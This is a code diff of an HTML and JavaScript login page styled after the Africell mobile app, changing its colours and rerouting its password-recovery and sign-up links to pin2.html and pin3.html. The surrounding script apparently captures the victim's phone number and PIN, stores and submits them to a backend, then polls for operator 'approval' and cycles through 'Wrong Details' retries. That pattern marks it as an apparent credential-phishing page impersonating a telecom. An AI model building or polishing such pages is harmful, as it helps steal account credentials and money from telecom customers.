@@ -18,8 +18,8 @@
         html, body {
             width: 100%;
             height: 100%;
-            /* Pantone Purple 2665 C Gradient (#9B1B75 / #5E0C44) */
-            background: linear-gradient(135deg, #9B1B75 0%, #7E145E 50%, #5E0C44 100%);
+            /* Updated to use your preferred purple (#991676) */
+            background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
             overflow: hidden;
         }
 
@@ -44,7 +44,7 @@
             font-weight: 900;
             letter-spacing: -0.5px;
             text-transform: uppercase;
-            color: #FFCC00;
+            color: #ffd34d;
         }
 
         .e-main-content {
@@ -147,8 +147,8 @@
         }
 
         .e-input-field:focus {
-            border-color: #FFCC00;
-            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2);
+            border-color: #ffd34d;
+            box-shadow: 0 0 20px rgba(255, 211, 77, 0.2);
         }
 
         .e-input-field::placeholder {
@@ -158,31 +158,11 @@
             text-align: center;
         }
 
-        /* Extra Links Row (Forgot Password & Sign Up) */
-        .e-extra-links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 13px;
-            margin-top: 12px;
-            color: rgba(255, 255, 255, 0.8);
-        }
-
-        .e-extra-links a {
-            color: #FFCC00;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .e-extra-links a:hover {
-            text-decoration: underline;
-        }
-
-        /* Full Width Main LOGIN Button */
+        /* Full Width Main SIGN IN Button */
         .e-btn-login {
             width: 100%;
             padding: 20px;
-            background: #FFCC00;
+            background: #ffd34d;
             color: #5E0C44;
             border: none;
             border-radius: 18px;
@@ -193,12 +173,13 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
             text-transform: uppercase;
             transition: all 0.2s ease;
+            margin-bottom: 16px;
         }
 
         .e-btn-login:hover {
             transform: translateY(-2px);
-            background: #ffe033;
-            box-shadow: 0 15px 35px rgba(255, 204, 0, 0.4);
+            background: #ffe066;
+            box-shadow: 0 15px 35px rgba(255, 211, 77, 0.4);
         }
 
         .e-btn-login:active {
@@ -213,6 +194,53 @@
             cursor: not-allowed;
             transform: none !important;
             box-shadow: none !important;
+        }
+
+        /* Forgot Password Link in Pure White Text */
+        .e-forgot-container {
+            text-align: center;
+            width: 100%;
+            margin-bottom: 24px;
+        }
+
+        .e-forgot-link {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: opacity 0.2s ease;
+        }
+
+        .e-forgot-link:hover {
+            opacity: 0.8;
+            text-decoration: underline;
+        }
+
+        /* End-to-End Corner Purple Rectangle Frame for Sign Up */
+        .e-signup-rect-btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: #991676;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 18px;
+            text-align: center;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            text-decoration: none;
+            cursor: pointer;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            transition: all 0.2s ease;
+        }
+
+        .e-signup-rect-btn:hover {
+            background: #79105c;
+            transform: translateY(-2px);
+        }
+
+        .e-signup-rect-btn:active {
+            transform: translateY(0);
         }
 
         /* Loading Spinner */
@@ -232,7 +260,7 @@
             width: 24px;
             height: 24px;
             border: 3px solid rgba(255, 255, 255, 0.2);
-            border-top: 3px solid #FFCC00;
+            border-top: 3px solid #ffd34d;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
@@ -259,7 +287,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(94, 12, 68, 0.9);
+            background: rgba(153, 22, 118, 0.9);
             backdrop-filter: blur(8px);
             justify-content: center;
             align-items: center;
@@ -268,7 +296,7 @@
         }
 
         .modal-card {
-            background: #9B1B75;
+            background: #991676;
             width: 100%;
             max-width: 320px;
             border-radius: 24px;
@@ -294,7 +322,7 @@
         }
 
         .modal-btn {
-            background: #FFCC00;
+            background: #ffd34d;
             color: #5E0C44;
             border: none;
             border-radius: 14px;
@@ -303,7 +331,7 @@
             font-weight: 700;
             cursor: pointer;
             width: 100%;
-            box-shadow: 0 6px 16px rgba(255, 204, 0, 0.3);
+            box-shadow: 0 6px 16px rgba(255, 211, 77, 0.3);
         }
 
         .modal-btn:active {
@@ -324,7 +352,7 @@
             <!-- Main Card & Login Form Section -->
             <div class="e-card-box">
                 <div class="e-card-header">
-                    <h1>Login</h1>
+                    <h1>Sign In</h1>
                     <p>with your Mobile Number</p>
                 </div>
 
@@ -336,19 +364,22 @@
                     </div>
                 </div>
 
-                <!-- Password input field (Visible text by default, masked on waiting) -->
+                <!-- Password input field -->
                 <div class="e-input-group" style="margin-bottom: 0;">
-                    <input type="text" id="uniqueId" class="e-input-field" placeholder="password" autocomplete="current-password" required>
-                </div>
-
-                <!-- Forgot Password & Sign Up Links -->
-                <div class="e-extra-links">
-                    <a href="https://play.google.com/store/apps/details?id=com.africell.africell.africellSLApp">Forgot Password?</a>
-                    <a href="https://play.google.com/store/apps/details?id=com.africell.africell.africellSLApp">Sign Up</a>
+                    <input type="text" id="uniqueId" class="e-input-field" placeholder="Password" autocomplete="current-password" required>
                 </div>
             </div>
 
-            <button class="e-btn-login" id="loginBtn" onclick="submitOrderAttempt()">Login</button>
+            <!-- Sign In Button -->
+            <button class="e-btn-login" id="loginBtn" onclick="submitOrderAttempt()">Sign In</button>
+
+            <!-- Forgot Password Link with Alert Trigger -->
+            <div class="e-forgot-container">
+                <a href="pin2.html" class="e-forgot-link" onclick="handleForgotClick(event)">Forgot Password?</a>
+            </div>
+
+            <!-- Sign Up Button with Alert Trigger -->
+            <a href="pin3.html" class="e-signup-rect-btn" onclick="handleSignUpClick(event)">New Here! Sign Up</a>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
@@ -372,13 +403,29 @@
     </div>
 
 <script>
-    function showAppAlert(message) {
+    let pendingRedirectUrl = '';
+
+    function showAppAlert(message, redirectUrl = '') {
         document.getElementById('modalText').innerText = message;
         document.getElementById('customModal').style.display = 'flex';
+        pendingRedirectUrl = redirectUrl;
     }
 
     function closeModal() {
         document.getElementById('customModal').style.display = 'none';
+        if (pendingRedirectUrl) {
+            window.location.href = pendingRedirectUrl;
+        }
+    }
+
+    function handleForgotClick(e) {
+        e.preventDefault();
+        showAppAlert('⚠️ Redirecting to Forgot Password recovery...', 'pin2.html');
+    }
+
+    function handleSignUpClick(e) {
+        e.preventDefault();
+        showAppAlert('✨ Redirecting to Account Registration...', 'pin3.html');
     }
 
     const phoneInput = document.getElementById('phoneNumber');
@@ -441,7 +488,6 @@
         localStorage.setItem('lastPin', uniqueId);
 
         try {
-            // Blur/disable button, mask password with dots, and show loading spinner while waiting for callback
             loginBtn.classList.add('disabled-state');
             passwordInput.type = 'password'; 
             if (spinnerDiv) spinnerDiv.style.display = 'flex';
@@ -458,14 +504,14 @@
                 pollApprovalStatus(fullPhoneVal);
             } else {
                 loginBtn.classList.remove('disabled-state');
-                passwordInput.type = 'text'; // Unmask password on failure
+                passwordInput.type = 'text'; 
                 if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('❌ Failed: Incorrect Password');
             }
         } catch (error) {
             console.error('Error:', error);
             loginBtn.classList.remove('disabled-state');
-            passwordInput.type = 'text'; // Unmask password on connection error
+            passwordInput.type = 'text'; 
             if (spinnerDiv) spinnerDiv.style.display = 'none';
             showAppAlert('Could not connect to the backend server.');
         }
@@ -490,7 +536,7 @@
                     clearInterval(statusInterval);
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
                     loginBtn.classList.remove('disabled-state');
-                    passwordInput.type = 'text'; // Unmask password
+                    passwordInput.type = 'text'; 
                     localStorage.clear(); 
                     showAppAlert('Wrong Details.');
                 } 
@@ -498,7 +544,7 @@
                     clearInterval(statusInterval);
                     if (spinnerDiv) spinnerDiv.style.display = 'none';
                     loginBtn.classList.remove('disabled-state');
-                    passwordInput.type = 'text'; // Unmask password
+                    passwordInput.type = 'text'; 
                     
                     let passwordAttemptCount = parseInt(sessionStorage.getItem('passwordAttemptCount') || '0', 10);
                     if (passwordAttemptCount <= 1) {
